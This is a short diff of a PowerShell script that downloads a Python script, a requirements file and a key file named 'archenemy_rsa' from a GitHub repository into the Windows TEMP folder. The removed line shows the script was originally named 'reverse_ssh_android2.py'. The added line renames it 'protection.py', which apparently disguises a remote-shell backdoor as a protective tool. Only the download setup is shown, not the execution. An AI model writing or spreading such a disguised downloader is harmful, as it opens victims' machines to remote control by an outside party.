@@ -36,7 +36,7 @@ $pythonPath = "$pythonPath\python.exe"
 # Download the python script directly with invoke-webrequest
 $outDirectory = "$env:TEMP"		# Temp directory in Windows
 
-$repoUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/reverse_ssh_android2.py"
+$repoUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/protection.py"
 $requirementsUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/requirements.txt"
 $contentUrl = "https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/archenemy_rsa"
 $scriptPath = "${outDirectory}/protection.py"
